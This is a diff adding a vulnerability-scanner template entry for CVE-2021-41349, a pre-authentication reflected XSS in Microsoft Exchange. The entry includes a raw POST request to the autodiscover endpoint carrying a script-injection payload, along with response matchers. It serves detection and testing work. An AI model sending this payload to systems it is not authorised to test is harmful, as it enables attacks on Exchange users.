@@ -38059,6 +38059,57 @@
       ]
     },
     {
+      "id": "CVE-2021-41349",
+      "info": {
+        "author": "rootxharsh,iamnoooob",
+        "classification": {
+          "cve-id": "CVE-2021-41349",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+          "cvss-score": 6.5
+        },
+        "description": "Microsoft Exchange Server Spoofing Vulnerability This CVE ID is unique from CVE-2021-42305.",
+        "name": "Pre-Auth POST Based Reflected XSS in Microsoft Exchange",
+        "reference": [
+          "https://github.com/httpvoid/CVE-Reverse/tree/master/CVE-2021-41349",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-41349",
+          "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-41349"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,microsoft,exchange"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "alert(document.domain);",
+                "a=\"\""
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                500
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /autodiscover/autodiscover.json HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n%3Cscript%3Ealert%28document.domain%29%3B+a=%22%3C%2Fscript%3E&x=1\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-41381",
       "info": {
         "author": "pikpikcu",
